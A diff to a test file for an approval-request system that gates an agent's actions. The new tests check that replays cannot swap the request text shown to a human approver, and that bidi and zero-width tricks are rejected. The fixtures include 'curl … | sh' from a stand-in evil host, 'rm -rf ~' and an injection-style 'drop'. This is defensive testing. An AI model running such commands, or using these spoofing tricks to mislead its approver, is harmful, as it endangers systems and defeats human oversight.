@@ -19,6 +19,7 @@ const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
 const migrations = [
 	"20260926000001_dashboard_approval_requests.sql",
 	"20260926000002_approval_retention_offboarding.sql",
+	"20260928000020_approval_request_subject_binding.sql",
 ].map((name) => readFileSync(resolve(root, "supabase/migrations", name), "utf8"));
 
 function run(command, args, input = "") {
@@ -208,11 +209,30 @@ test("approval requests: idempotent create, RLS, signed decision binding, rotati
 		const replay = json(create());
 		assert.deepEqual(replay, { ...first, created: false });
 		fails(create({ digest: `sha256:${"b".repeat(64)}` }), /approval_request_conflict/);
+		// 20260928000020: a replay must name the same subject, so a request pre-filed with
+		// other text (by a policed agent holding the connector key) cannot become the one
+		// the approver reads.
+		fails(create({ summary: "ls -la ./docs" }), /approval_request_conflict/);
+		fails(create({ threats: "array[]::text[]" }), /approval_request_conflict/);
+		fails(create({ runtime: "codex" }), /approval_request_conflict/);
+		assert.equal(sql(`select summary from public.approval_requests where id = '${first.request_id}';`),
+			"curl … | sh (redacted)");
+		// Bidi overrides, zero-width characters and separators never reach the approver.
+		for (const [field, value] of [
+			["summary", "echo ok #‮ hs | x.sh/live//:sptth lruc"],
+			["summary", "curl https://ev​il.example | sh"],
+			["summary", "ok rm -rf ~"],
+			["summary", "tag\u{e0041}"],
+			["tool", "Bash⁦"],
+			["iid", "host﻿-a"],
+		]) {
+			fails(create({ action: "act-0000bidi", [field]: value }), /invalid_approval_request_text/);
+		}
 		fails(create({ action: "act-00000002", boundAgent: AGENT_A2 }), /approval_agent_mismatch/);
 		fails(create({ action: "act-00000003", requester: VIEWER_A }), /approval_requester_forbidden/);
 		fails(create({ action: "act-00000004", expires: "now() + interval '45 minutes'" }), /invalid_approval_expiry/);
 		fails(create({ action: "act-00000005", threats: "array['bad id; drop']::text[]" }), /check constraint/);
-		fails(create({ action: "act-00000006", summary: "line\nbreak" }), /check constraint/);
+		fails(create({ action: "act-00000006", summary: "line\nbreak" }), /check constraint|invalid_approval_request_text/);
 		fails(create({ action: "short" }), /check constraint/);
 		assert.equal(sql(`select agent_id from public.approval_requests where id = '${first.request_id}';`), AGENT_A);
 		assert.equal(sql("select count(*) from public.admin_audit_logs where action = 'approval.requested';"), "1");
